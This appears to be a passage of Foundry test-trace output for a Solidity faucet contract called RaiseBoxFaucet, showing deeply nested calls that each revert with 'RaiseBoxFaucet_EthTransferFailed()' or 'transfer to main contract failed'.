    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
